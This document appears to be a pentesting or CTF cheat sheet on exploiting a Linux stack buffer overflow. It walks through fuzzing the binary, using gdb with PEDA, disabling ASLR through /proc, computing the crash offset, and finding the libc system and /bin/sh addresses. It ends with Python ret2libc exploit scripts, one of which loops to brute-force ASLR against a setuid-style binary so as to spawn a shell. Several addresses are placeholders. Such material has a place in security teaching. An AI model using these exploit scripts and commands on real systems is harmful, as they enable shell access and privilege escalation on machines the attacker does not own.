# Buffer Overflow

## Test Overflow

```
./binary `python -c 'print "A"*500'`
```

## Open binary with gdb

First install Python Exploit Development Assistance for GDB.
```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

```
gdb ./binary
gdb# b main
gdb# r
```

## Identify if host has ASLR

ASLR - when the address for libc keeps changing.

```
ldd binary | grep libc (run multiple times and check if address changes)
```

Disable ASLR

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

## Create patterns

Create a pattern tht never repeats/ unique string.

```
locate pattern_
pattern_create.rb -l 200
```

Pass argument to binary

```
gdb ./binary
gdb# r '$PATTERN'
```

Copy memory addres of the crash 
```bash
pattern_offset.rb -q 0x64413764   #(Address)
Found match at offset 112
```

## Start buffer overflow script

```python
import struct

buf = "A" * 112
buf += struct.pack("<I",0xd3adc0d3)

print buf
```

```
gdb ./binary
gdb# r 'python buff.py'
```

## Find important addresses

### On Victim machine

```bash 
ldd ovrfl | grep libc #returns the libc address and location
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i system # get system@@GLIBC offset address
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -i exit # get exit@@GLIBC offset address
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep bin/sh # get bin/sh string offset address
```

### Or using gdb in similar VM (ASLR is on)
```retlib.c
#include <stdlib.h>
 void main() {
     system("/bin/sh");
 }
```

```
gcc retlib.c -o retlibc
gdb ./retlib
#gdb p system   #get system address
#gdb p exit   #get exit address
#gdb searchmem /bin/sh #get /bin/sh address
#gdb find 0xf7e0c980, +9999999, "/bin/sh"  #get /bin/sh address
```

### Additions to script


```python
import struct

system_addr = struct.pack("<I",0x88482f8)
exit_addr = struct.pack("<I",0xd3adc0d3)
arg_addr = struct.pack("<I",0x88482f8)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

print buf
```

```
gdb# r 'python buff.py'
```

### Bruteforce ASLR

On the actual host grab one of the libc addresses.


```python
from subprocess import call
import struct

libc_base_addr = 0x88482f8

system_off = 0xd3adc0d3
exit_off = 0xd3adc0d3
arg_sh = 0xd3adc0d3

system_addr = struct.pack("<I",libc_base_addr + system_off)
exit_addr = struct.pack("<I", libc_base_addr + exit_off)
arg_addr = struct.pack("<I",libc_base_addr + arg_sh)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

i=0
while (i < 512):
    print "Try: %s" %i
    i +=1
    ret = call(["/usr/local/bin/ovrflw",buf])
```

If ASLR is off the script will work without the loop and with the print at the end

```
./binary $(python /dev/shm/exploit.py)
```